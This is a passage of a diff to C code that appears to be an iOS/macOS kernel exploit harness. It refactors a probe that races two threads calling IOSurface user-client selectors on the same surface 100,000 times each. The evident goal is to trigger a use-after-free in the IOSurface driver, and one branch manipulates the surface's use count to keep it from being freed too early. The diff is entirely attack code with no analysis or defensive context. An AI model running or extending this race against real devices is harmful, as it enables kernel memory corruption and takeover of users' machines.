@@ -15333,30 +15333,18 @@ r356_done:
 typedef struct {
     io_connect_t conn;
     uint64_t surf_id;
-    volatile int go;
-    volatile int done;
+    volatile int *go;
     int iterations;
+    uint32_t selector;
 } race_ctx_359_t;
 
-static void *r359_race_register(void *arg) {
+static void *r359_race_thread(void *arg) {
     race_ctx_359_t *ctx = (race_ctx_359_t *)arg;
-    while (!ctx->go) {} /* spin until go */
+    while (!*ctx->go) {} /* spin until go */
     for (int i = 0; i < ctx->iterations; i++) {
         uint64_t sc[1] = {ctx->surf_id};
-        IOConnectCallScalarMethod(ctx->conn, 17, sc, 1, NULL, NULL);
+        IOConnectCallScalarMethod(ctx->conn, ctx->selector, sc, 1, NULL, NULL);
     }
-    ctx->done++;
-    return NULL;
-}
-
-static void *r359_race_unregister(void *arg) {
-    race_ctx_359_t *ctx = (race_ctx_359_t *)arg;
-    while (!ctx->go) {} /* spin until go */
-    for (int i = 0; i < ctx->iterations; i++) {
-        uint64_t sc[1] = {ctx->surf_id};
-        IOConnectCallScalarMethod(ctx->conn, 18, sc, 1, NULL, NULL);
-    }
-    ctx->done++;
     return NULL;
 }
 
@@ -15548,24 +15536,20 @@ static void r359_probe(void) {
             int ti = (s == 0) ? t * (created / 4) : (s * 16 + t) % created;
             uint32_t target_id = surf_ids[ti];
 
-            /* Bump use count before race so dec doesn't immediately free */
             if (s == 1) IOSurfaceIncrementUseCount(surfs[ti]);
 
-            race_ctx_359_t ctx = { .conn = conn, .surf_id = target_id,
-                                   .go = 0, .done = 0, .iterations = 100000 };
-            /* Override selectors for this strategy */
-            race_ctx_359_t ctx2 = ctx;
+            volatile int go_flag = 0;
+            race_ctx_359_t ctx_a = { .conn = conn, .surf_id = target_id,
+                                     .go = &go_flag, .iterations = 100000,
+                                     .selector = (uint32_t)strat_sels[s][0] };
+            race_ctx_359_t ctx_b = { .conn = conn, .surf_id = target_id,
+                                     .go = &go_flag, .iterations = 100000,
+                                     .selector = (uint32_t)strat_sels[s][1] };
 
             pthread_t th_a, th_b;
-            /* Thread A uses strat_sels[s][0], Thread B uses strat_sels[s][1] */
-            /* Reuse register/unregister threads but with patched selectors */
-            /* We'll modify the context to encode the selector */
-            ctx.conn = conn; /* thread A: register thread uses sel stored */
-            ctx2.conn = conn;
-
-            pthread_create(&th_a, NULL, r359_race_register, &ctx);
-            pthread_create(&th_b, NULL, r359_race_unregister, &ctx2);
-            ctx.go = 1; ctx2.go = 1;
+            pthread_create(&th_a, NULL, r359_race_thread, &ctx_a);
+            pthread_create(&th_b, NULL, r359_race_thread, &ctx_b);
+            go_flag = 1;
             pthread_join(th_a, NULL);
             pthread_join(th_b, NULL);
 
